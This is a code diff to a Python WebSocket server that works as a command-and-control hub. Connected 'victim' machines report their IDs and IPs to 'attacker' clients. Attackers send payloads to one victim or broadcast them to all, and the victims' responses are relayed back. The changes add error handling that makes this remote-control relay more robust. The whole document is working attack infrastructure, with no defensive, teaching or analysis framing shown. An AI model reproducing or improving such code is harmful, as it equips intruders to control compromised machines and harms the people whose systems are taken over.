@@ -21,36 +21,49 @@ async def websocket_endpoint(ws: WebSocket):
         ip = ws.client.host
         print(f"[+] Victim connected: {victim_id} ({ip})")
 
+        # Notify all connected attackers about this new victim
         for atk in attackers:
-            await atk.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
+            try:
+                await atk.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
+            except Exception as e:
+                print("Error sending victim connection to attacker:", e)
 
         try:
             while True:
                 response = await ws.receive_text()
                 print(f"[🚨 From {victim_id}] {response}")
                 for atk in attackers:
-                    await atk.send_text(f"[{victim_id}] {response}")
+                    try:
+                        await atk.send_text(f"[{victim_id}] {response}")
+                    except Exception as e:
+                        print("Error sending response to attacker:", e)
         except WebSocketDisconnect:
             del victims[victim_id]
             print(f"[-] Victim disconnected: {victim_id}")
             for atk in attackers:
-                await atk.send_text(f"[🔴] Victim disconnected: {victim_id}")
+                try:
+                    await atk.send_text(f"[🔴] Victim disconnected: {victim_id}")
+                except Exception as e:
+                    print("Error sending victim disconnection to attacker:", e)
 
     elif role == "attacker":
         attackers.append(ws)
         print(f"[+] Attacker connected: {ws.client.host}")
 
-        # Send existing victims to this new attacker
+        # Sync existing victims to this new attacker connection
         for victim_id, victim_ws in victims.items():
             ip = victim_ws.client.host
-            await ws.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
+            try:
+                await ws.send_text(f"[🟢] Victim connected: {victim_id} ({ip})")
+            except Exception as e:
+                print("Error syncing victim to attacker:", e)
 
         try:
             while True:
                 command = await ws.receive_text()
 
                 if command.startswith("to:"):
-                    # Format: to:victim-1|<payload>
+                    # Command format: to:victim-<id>|<payload>
                     parts = command.split("|", 1)
                     victim_tag = parts[0][3:]
                     payload = parts[1]
@@ -60,10 +73,12 @@ async def websocket_endpoint(ws: WebSocket):
                     else:
                         await ws.send_text(f"[❌] Victim {victim_tag} not found")
                 else:
-                    # broadcast to all victims
+                    # Broadcast to all victims
                     for victim_ws in victims.values():
-                        await victim_ws.send_text(command)
-
+                        try:
+                            await victim_ws.send_text(command)
+                        except Exception as e:
+                            print("Error broadcasting command to victim:", e)
         except WebSocketDisconnect:
             attackers.remove(ws)
             print(f"[-] Attacker disconnected: {ws.client.host}")
